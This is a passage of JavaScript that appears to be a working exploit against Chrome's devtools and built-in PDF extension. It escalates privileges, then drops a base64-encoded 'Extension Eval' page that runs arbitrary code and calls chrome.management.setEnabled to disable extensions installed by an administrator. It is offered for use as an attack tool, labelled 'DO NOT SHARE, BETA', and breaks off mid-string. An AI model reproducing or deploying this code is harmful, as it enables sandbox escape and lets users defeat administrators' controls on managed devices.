((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/inspector.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsIC0gUmlndG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2Pgo8L2JvZHk+CjxzY3JpcHQ+Cm9uZXJyb3IgPSBhbGVydDsKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7Ci8vIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgLy8gY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCk7Ci8vIH0KY29uc3QgbWFuYWdlbWVudFRlbXBsYXRlID0gYAoKPGRpdiBpZD0iY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiPgo8aDE+IGNocm9tZS5tYW5hZ2VtZW50IERpc2FibGUgRXh0ZW5zaW9ucyA8L2gxPgo8cD4gTm90ZSB0aGF0IHRoaXMgb25seSB3b3JrcyBvbiBleHRlbnNpb25zIGluc3RhbGxlZCBieSB5b3VyIGFkbWluaXN0cmF0b3IgPC9wPgo8b2wgY2xhc3M9ImV4dGxpc3QiPgogIAo8L29sPjxici8+CjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZXh0bnVtIiAvPjxidXR0b24gZGlzYWJsZWQgaWQ9InRvZ2dsZXIiPlRvZ2dsZSBleHRlbnNpb248L2J1dHRvbj4KPC9kaXY+CgppbmZvOiBETyBOT1QgU0hBUkUsIEJFVEEKYDsgLy8gVE9ETzogQWRkIENTUyBmb3IgdGhpcwpsZXQgc2F2ZWRFeHRMaXN0ID0gW107CmNvbnN0IHNsaWRlcyA9IFtdOwpsZXQgYWN0aXZlU2xpZGVJZHggPSAwOwpjb25zdCBoYW5kbGVDYWxsYmFja3NfID0gW107CmNvbnN0IFdBSVRfRk9SX0ZJTklTSCA9IDE7CnJlcXVlc3RBbmltYXRpb25GcmFtZShmdW5jdGlvbiBhKHQpIHsKICBmb3IgKGNvbnN0IGNiIG9mIGhhbmRsZUNhbGxiYWNrc18pIHsKICAgIGxldCBtOwogICAgaWYgKCBtID0gKGNiLmYuYXBwbHkobnVsbCwgW3QgLSBjYi50XSkpKSB7CiAgICAgIGlmIChtID09PSAxKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9ZWxzZSB7CiAgICAgIGhhbmRsZUNhbGxiYWNrc18uc3BsaWNlKGhhbmRsZUNhbGxiYWNrc18uaW5kZXhPZihjYiksIDEpOwogICAgICB9CiAgICB9OwogIH07CiAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKGEpOwp9KQpjb25zdCBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lID0gKGNiLCB0aGl6ID0gbnVsbCwgYXJncyA9IFtdKSA9PiB7CiAgaGFuZGxlQ2FsbGJhY2tzXy5wdXNoKHsKICAgIGY6IGNiLAogICAgdDogcGVyZm9ybWFuY2Uubm93KCkKICB9KTsKfQoKY2xhc3MgRXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKICBzdGF0aWMgc2V0dXBTbGlkZXMoYWN0aXZlaWR4ID0gMCkgewogICAgaWYgKGNocm9tZS5tYW5hZ2VtZW50KSB7CiAgc2xpZGVzLnB1c2goZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0JykpOwogICAgfQogICAgc2xpZGVzLnB1c2goZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2V4dF9kZWZhdWx0JykpOwogICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzbGlkZXMubGVuZ3RoOyBpKyspIHsKICAgICAgaWYgKGkgPT09IGFjdGl2ZWlkeCkgewogICAgICAgIHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgfQogICAgICBlbHNlIHsKICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgfQogICAgfQogICAgYWN0aXZlU2xpZGVJZHggPSBhY3RpdmVpZHg7CiAgICAKICAgIG9ua2V5ZG93biA9IGZ1bmN0aW9uIChldikgewogICAgICBpZiAoZXYucmVwZWF0KSByZXR1cm47CiAgICAgIAogICAgICBpZiAodGhpcy5nZXRTZWxlY3Rpb24oKSAmJiB0aGlzLmdldFNlbGVjdGlvbigpLmFuY2hvck5vZGUudGFnTmFtZSkgewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBpZiAoZXYua2V5LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoImxlZnQiKSkgewogICAgICAgIGFjdGl2ZVNsaWRlSWR4LS07CiAgICAgICAgaWYgKGFjdGl2ZVNsaWRlSWR4IDwgMCkgewogICAgICAgICAgYWN0aXZlU2xpZGVJZHggKz0gKHNsaWRlcy5sZW5ndGgpOwogICAgICAgIH0KICAgICAgICBhY3RpdmVTbGlkZUlkeCAlPSAoc2xpZGVzLmxlbmd0aCk7CiAgICAgICAgZXYucHJldmVudERlZmF1bHQoKTsKICAgICAgfQogICAgICBpZiAoZXYua2V5LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoInJpZ2h0IikpIHsKICAgICAgICBhY3RpdmVTbGlkZUlkeCsrOwogICAgICAgIGlmIChhY3RpdmVTbGlkZUlkeCA8IDApIHsKICAgICAgICAgIGFjdGl2ZVNsaWRlSWR4ICs9IChzbGlkZXMubGVuZ3RoKTsKICAgICAgICB9CiAgICAgICAgYWN0aXZlU2xpZGVJZHggJT0gKHNsaWRlcy5sZW5ndGgpOyAgICAKICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgfQogICAgICBFeHRlbnNpb25DYXBhYmlsaXRpZXMuc2V0QWN0aXZlU2xpZGVJbmRleChhY3RpdmVTbGlkZUlkeCk7CiAgICB9CiAgfQogIHN0YXRpYyBzZXRBY3RpdmVTbGlkZUluZGV4KGlkeCkgewogICAgZnVuY3Rpb24gYSh0KSB7CiAgICAgIGNvbnN0IHNlY29uZHMgPSB0LzEwMDA7CiAgICAgIGlmIChzZWNvbmRzID49IDAuMikgewogICAgICAgIC8vIHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9CiAgICAgIHNsaWRlc1tpZHhdLnN0eWxlLm9wYWNpdHkgPSBTdHJpbmcoKHNlY29uZHMpLygwLjIpKTsKCiAgICB9CiAgICBmb3IgKGxldCBpID0gMDsgaSA8IHNsaWRlcy5sZW5ndGg7IGkrKykgewogICAgICBpZiAoaSA9PT0gaWR4KSB7CiAgICAgICAgCiAgICAgICAgc2xpZGVzW2ldLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgIAogICAgICB9CiAgICAgIGVsc2UgewogICAgICAgIGlmIChzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9PT0gImJsb2NrIikgewogICAgICAgICAgc2xpZGVzW2ldLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICAgICAgICAgIGNvbnN0IG0gPSBpOwogICAgICAgICAgaGFuZGxlSW5BbmltYXRpb25GcmFtZShmdW5jdGlvbiAodCkgewogICAgICAgICAgICBjb25zdCBzZWNvbmRzID0gdC8xMDAwOwogICAgICAgICAgICBpZiAoMC44IC0gc2Vjb25kcyA8PSAwKSB7CiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgc2xpZGVzW2ldLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgICAgICAgaGFuZGxlSW5BbmltYXRpb25GcmFtZShhKTsKICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBzbGlkZXNbaV0uc3R5bGUub3BhY2l0eSA9IFN0cmluZygoICgwLjIgLSBzZWNvbmRzKSAvIDAuMikpOwogICAgICAgICAgICAKICAgICAgICAgIH0pCiAgICAgICAgfQogICAgICAgIC8vIHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICB9CiAgICB9CiAgfQogIAogIGFjdGl2YXRlICgpIHt9Cn0KY2xhc3MgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcyBleHRlbmRzIEV4dGVuc2lvbkNhcGFiaWxpdGllcyB7CiAgc3RhdGljIHRlbXBsYXRlID0gYAogIDxkaXYgaWQ9ImV4dF9kZWZhdWx0Ij4KICA8ZGl2IGlkPSJkZWZhdWx0X2V4dGVuc2lvbl9jYXBhYmlsaXRpZXMiPgogICAgPGgxPiBEZWZhdWx0IEV4dGVuc2lvbiBDYXBhYmlsaXRpZXMgPC9oMT4KCiAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDE+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImNvZGVfaW5wdXQiLz48YnV0dG9uIGlkPSJjb2RlX2V2YWx1YXRlIj5FdmFsdWF0ZTwvYnV0dG9uPgogICAgCiAgPC9kaXY+CiAgPGRpdiBpZD0iZXh0ZW5zaW9uX3RhYnNfZGVmYXVsdCI+CiAgICA8YnV0dG9uIGlkPSJ0YWJyZWxvYWQiPiBSZWZyZXNoIFRhYnM8L2J1dHRvbj4KICAgIDxoMT4gVXBkYXRlIHRhYnMgPC9oMT4KICAgIDxvbD4KICAgIAogICAgPC9vbD4KICAgIDxpbnB1dCBpZD0iVGFiVVJMSW5wdXQiIC8+IDxidXR0b24gaWQ9IlRhYlVSTFN1Ym1pdCI+Q3JlYXRlPC9idXR0b24+CiAgICAKICA8L2Rpdj4KICA8L2Rpdj4KICBgOyAvLyBUT0RPOiBGaXggTmF2aWdhdG9yIChGb3Igbm93IEkgcmVtb3ZlZCBpdCkKICB1cGRhdGVUYWJMaXN0KHRhYmxpc3QsIGlzVGFiVGl0bGVRdWVyeWFibGUsIHRhYlN0YXR1cykgewogICAgaWYgKHRoaXMuZGlzYXJtZWQpIHsKICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmICh0aGlzLnRhYkxpc3RJblByb2dyZXNzKSB7CiAgICAgIGNvbnNvbGUubG9nKCJJbiBwcm9ncmVzcyB0YWJsaXN0IGJ1aWxkaW5nISIpOwogICAgICAvLyBzZXRUaW1lb3V0KHRoaXMudXBkYXRlVGFiTGlzdC5iaW5kKHRoaXMsIHRhYmxpc3QsIGlzVGFiVGl0bGVRdWVyeWFibGUsIHRhYlN0YXR1cykpOwogICAgICByZXR1cm47CiAgICB9CiAgICB0aGlzLnRhYkxpc3RJblByb2dyZXNzID0gdHJ1ZTsKICAgIHRhYmxpc3QuaW5uZXJIVE1MID0gIiI7CiAgICBjb25zdCB0aGl6ID0gdGhpczsKICAgIGNocm9tZS53aW5kb3dzLmdldEFsbChmdW5jdGlvbiAod2luKSB7CiAgICAgIHdpbi5mb3JFYWNoKGZ1bmN0aW9uICh2KSB7CiAgICAgICAgY2hyb21lLnRhYnMucXVlcnkoe3dpbmRvd0lkOiB2LmlkfSwgZnVuY3Rpb24gKHRhYkluZm9zKSB7CiAgICAgICAgICB0YWJJbmZvcy5mb3JFYWNoKGZ1bmN0aW9uIChpbmZvKSB7CiAgICAgICAgICAgIGNvbnN0IGxpc3RJdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGkiKTsKICAgICAgICAgICAgbGlzdEl0ZW0udGV4dENvbnRlbnQgPSBpc1RhYlRpdGxlUXVlcnlhYmxlCiAgICAgICAgICAgICAgPyBgJHtpbmZvLnRpdGxlfSAoJHtpbmZvLnVybH0pYAogICAgICAgICAgICAgIDogIihub3QgYXZhaWxhYmxlKSI7CiAgICAgICAgICAgIGxpc3RJdGVtLmlubmVySFRNTCArPSAnPGJyLz48aW5wdXQgdHlwZT0idGV4dCIgLz4gPGJ1dHRvbj5OYXZpZ2F0ZTwvYnV0dG9uPic7CiAgICAgICAgICAgIGNvbnN0IGJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICBidXR0b24uaW5uZXJIVE1MID0gIlByZXZpZXciOwogICAgICAgICAgICBsaXN0SXRlbS5xdWVyeVNlbGVjdG9yKCdidXR0b24nKS5vbmNsaWNrID0gZnVuY3Rpb24gKGV2KSB7CiAgICAgICAgICAgICAgY29uc3QgaW5wID0gbGlzdEl0ZW0ucXVlcnlTZWxlY3RvcignaW5wdXQnKTsKICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKGluZm8uaWQsIHsKICAgICAgICAgICAgICAidXJsIjogaW5wLnZhbHVlCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gdHJ1ZTsKCiAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gdHJ1ZTsKCiAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKGluZm8ud2luZG93SWQsIHsKICAgICAgICAgICAgICAgIGZvY3VzZWQ6IHRydWUKICAgICAgICAgICAgICB9LCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUoaW5mby5pZCwgeyBhY3RpdmU6IHRydWUgfSk7CiAgICAgICAgICAgICAgIAogICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgIHdpbmRvdy5jdXJyZW50VGltZW91dCA9IHNldFRpbWVvdXQoZnVuY3Rpb24gbSgpIHsKICAgICAgICAgICAgICAgIGNsZWFyVGltZW91dCh3aW5kb3cuY3VycmVudFRpbWVvdXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5nZXRDdXJyZW50KGZ1bmN0aW9uICh0YWIpIHsKICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKHRhYi53aW5kb3dJZCwgewogICAgICAgICAgICAgICAgICAgIGZvY3VzZWQ6IHRydWUKICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZSh0YWIuaWQsIHsgYWN0aXZlOiB0cnVlIH0pOwogICAgICAgICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgIH0sIDEwMCk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIHRhYmxpc3QuYXBwZW5kQ2hpbGQobGlzdEl0ZW0pOwogICAgICAgICAgICB0YWJsaXN0LmFwcGVuZENoaWxkKGJ1dHRvbik7CiAgICAgICAgICB9KTsKICAgICAgICAgIHRoaXoudGFiTGlzdEluUHJvZ3Jlc3MgPSBmYWxzZTsKICAgICAgICAgIGlmIChpc1RhYlRpdGxlUXVlcnlhYmxlKSB7CiAgICAgICAgICAgIHRhYlN0YXR1cy5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdGFiU3RhdHVzLnRleHRDb250ZW50ID0KICAgICAgICAgICAgICAiKFNvbWUgZGF0YSBtaWdodCBub3QgYmUgYXZhaWxhYmxlLCBiZWNhdXNlIHRoZSBleHRlbnNpb24gZG9lc24ndCBoYXZlIHRoZSAndGFicycgcGVybWlzc2lvbikiOwogICAgICAgICAgfQogICAgICAgIH0pOwogICAgICB9KQogICAgfSk7CiAgfQogIGFjdGl2YXRlKCkgewogICAgZG9jdW1lbnQud3JpdGUoRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy50ZW1wbGF0ZSk7CiAgICAvLyBkb2N1bWVudC5jbG9zZSgpOwogICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V4dF9kZWZhdWx0IikucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uJykuZm9yRWFjaChmdW5jdGlvbiAoYnRuKSB7CiAgICAgICAvLyBhbGVydCgicHJlcHBpbmcgYnV0dG9uICIgKyBidG4uaWQpOwogICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCB0aGlzLm9uQnRuQ2xpY2tfLmJpbmQodGhpcywgYnRuKSk7CiAgICAgfSwgdGhpcyk7CiAgICAKICAgIHRoaXMudXBkYXRlVGFiTGlzdChkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJyNleHRlbnNpb25fdGFic19kZWZhdWx0JykucXVlcnlTZWxlY3Rvcignb2wnKSwgKCEhY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9ucy5pbmNsdWRlcygndGFicycpKSk7CiAgICBmb3IgKHZhciBpIGluIGNocm9tZS50YWJzKSB7CiAgICAgIGlmIChpLnN0YXJ0c1dpdGgoJ29uJykpIHsKICAgICAgICBjaHJvbWUudGFic1tpXS5hZGRMaXN0ZW5lcihmdW5jdGlvbiAoZXYpIHsKICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdChkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJyNleHRlbnNpb25fdGFic19kZWZhdWx0JykucXVlcnlTZWxlY3Rvcignb2wnKSwgKCEhY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9ucy5pbmNsdWRlcygndGFicycpKSk7CiAgICAgICAgfSkKICAgICAgfQogICAgfQogICAgLy8gZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCcnKQogIH0KICBzdGF0aWMgZ2V0RlMoKSB7CiAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUpIHsKICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oVEVNUE9SQVJZLCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgfSk7CiAgfQogIC8qKgogICAqIEBwYXJhbSB7SFRNTEJ1dHRvbkVsZW1lbnR9IGIKICAgKi8KICBhc3luYyBvbkJ0bkNsaWNrXyhiKSB7CiAgICBzd2l0Y2ggKGIuaWQpIHsKICAgICAgY2FzZSAiY29kZV9ldmFsdWF0ZSI6IHsKICAgICAgICBjb25zb2xlLmxvZygiRXZhbHVhdGluZyBjb2RlISIpOwogICAgICAgIGNvbnN0IHggPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZV9pbnB1dCIpLnZhbHVlOwogICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwogICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgeyBjcmVhdGU6IHRydWUgfSwgZnVuY3Rpb24gKGVudHJ5KSB7CiAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uICh3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoInNyYy5qcyIsIHgpOwogICAgICAgIGxldCBzY3JpcHQgPQogICAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXZhbHVhdGVfZWxlbSIpID8/CiAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQucmVtb3ZlKCk7CiAgICAgICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LmlkID0gImV2YWx1YXRlX2VsZW0iOwogICAgICAgIHNjcmlwdC5zcmMgPSB1cmw7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwogICAgICB9CiAgICAgIGNhc2UgInRhYnJlbG9hZCI6ewogICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdChkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJyNleHRlbnNpb25fdGFic19kZWZhdWx0JykucXVlcnlTZWxlY3Rvcignb2wnKSwgKCEhY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9ucy5pbmNsdWRlcygndGFicycpKSk7CiAgICAgIH0KICAgIH0KICB9Cn0KY2xhc3MgSG9zdFBlcm1pc3Npb25zIHsKICBhY3RpdmF0ZSgpIHt9Cn0KZnVuY3Rpb24gdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCkgewogIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSwgcmVqZWN0KSB7CiAgICBleHRsaXN0X2VsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24gKGV4dGxpc3QpIHsKICAgICAgY29uc3Qgb3JkbGlzdCA9IFtdOwogICAgICBsZXQgZSA9IDA7CiAgICAgIGV4dGxpc3QuZm9yRWFjaChmdW5jdGlvbiAoZSkgewogICAgICAgIGlmIChlLmlkID09PSBuZXcgVVJMKG5ldyBVUkwobG9jYXRpb24uaHJlZikub3JpZ2luKS5ob3N0KSB7CiAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIG9yZGxpc3QucHVzaChlKTsKICAgICAgICBjb25zdCBpdGVtRWxlbWVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgICAgICAgaXRlbUVsZW1lbnQudGV4dENvbnRlbnQgPSBgJHtlLm5hbWV9ICgke2UuaWR9KSBgOwogICAgICAgIGNvbnN0IGFFbGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOwogICAgICAgIGFFbGVtLmhyZWYgPSAiamF2YXNjcmlwdDp2b2lkKDApIjsKICAgICAgICBhRWxlbS5pbm5lclRleHQgPSBgJHtlLmVuYWJsZWQgPyAiZW5hYmxlZCIgOiAiZGlzYWJsZWQifWA7CiAgICAgICAgYUVsZW0ub25jbGljayA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgIC8vIGFsZXJ0KGUuZW5hYmxlZCk7CiAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGUuaWQsICFlLmVuYWJsZWQpOwogICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgICAgfSwgMjAwKTsKICAgICAgICB9CiAgICAgICAgLy8gZSsrOwogICAgICAgIGl0ZW1FbGVtZW50LmFwcGVuZENoaWxkKGFFbGVtKTsKICAgICAgICBleHRsaXN0X2VsZW1lbnQuYXBwZW5kQ2hpbGQoaXRlbUVsZW1lbnQpOwogICAgICAgIHJlc29sdmUoKTsKICAgICAgfSk7CiAgICAgIHNhdmVkRXh0TGlzdCA9IG9yZGxpc3Q7CiAgICB9KTsKICB9KTsKfQpjb25zdCBmaWxlTWFuYWdlclByaXZhdGVUZW1wbGF0ZSA9IGAKICA8ZGl2IGlkPSJmaWxlTWFuYWdlclByaXZhdGVfY2FwIj4KICAgIDxkaXYgaWQ9IkZNUF9vcGVuVVJMIj4KICAgICAgPGJ1dHRvbiBpZD0iYnRuX0ZNUF9vcGVuVVJMIj5PcGVuIFVSTCBpbiBTa2lvdm94IHdpbmRvdzwvYnV0dG9uPgogICAgPC9kaXY+CiAgPC9kaXY+CgpgCm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uIHgoKSB7CiAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgZG9jdW1lbnQub3BlbigpOwogIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgICAvLyBhbGVydCgxKTsKICAgIGNocm9tZS5maWxlTWFuYWdlclByaXZhdGUub3BlblVSTCgiZGF0YTp0ZXh0L2h0bWwsPGgxPkhlbGxvPC9oMT4iKTsKICAgIGRvY3VtZW50LndyaXRlKGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlKTsKICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcignI2J0bl9GTVBfb3BlblVSTCcpLm9uY2xpY2sgPSBmdW5jdGlvbiAoZXYpIHsKICAgIH07CiAgfQogIGlmIChjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKSB7CiAgICAKICAgIHRoaXMuZG9jdW1lbnQud3JpdGUobWFuYWdlbWVudFRlbXBsYXRlKTsKICAgIGNvbnN0IGV4dGxpc3RfZWxlbWVudCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5leHRsaXN0Iik7CiAgICBhd2FpdCB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgIGNvbnN0IGNvbnRhaW5lcl9leHRlbnNpb25zID0gZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKAogICAgICAiI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0IiwKICAgICk7CiAgIC